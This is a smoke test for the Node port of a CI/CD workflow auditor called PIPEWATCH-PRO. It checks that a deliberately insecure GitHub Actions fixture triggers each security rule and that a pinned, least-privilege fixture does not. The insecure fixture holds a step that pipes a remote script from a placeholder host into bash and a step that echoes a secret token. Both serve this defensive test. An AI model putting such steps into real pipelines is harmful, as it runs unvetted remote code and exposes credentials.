// Smoke test for the Node port (stdlib node:assert / node:test).
import { test } from "node:test";
import assert from "node:assert/strict";
import { auditText, summarize, TOOL_NAME, TOOL_VERSION } from "./index.js";

const GH = ".github/workflows/ci.yml";

const RISKY = `name: ci
on:
  pull_request_target:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl https://x.test/i.sh | bash
      - run: echo \${{ secrets.TOKEN }}
`;

const CLEAN = `name: ci
on:
  push:
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8f152de45cc393bb48ce5d89d36b731f54556e65
      - run: make build
`;

test("identity", () => {
  assert.equal(TOOL_NAME, "PIPEWATCH-PRO");
  assert.ok(TOOL_VERSION);
});

test("risky flags each category", () => {
  const rules = new Set(auditText(RISKY, GH).map((f) => f.rule_id));
  for (const want of ["CICD-SEC-01", "CICD-SEC-04", "CICD-SEC-05", "CICD-SEC-06", "CICD-SEC-07"])
    assert.ok(rules.has(want), `missing ${want}`);
});

test("clean has no high/critical", () => {
  const bad = auditText(CLEAN, GH).filter((f) => f.severity === "high" || f.severity === "critical");
  assert.deepEqual(bad, []);
});

test("sha-pin not flagged", () => {
  assert.equal(auditText(CLEAN, GH).filter((f) => f.rule_id === "CICD-SEC-04").length, 0);
});

test("summary totals reconcile", () => {
  const f = auditText(RISKY, GH);
  const s = summarize(f);
  assert.equal(s.total, f.length);
  assert.ok(s.failed >= 1);
});
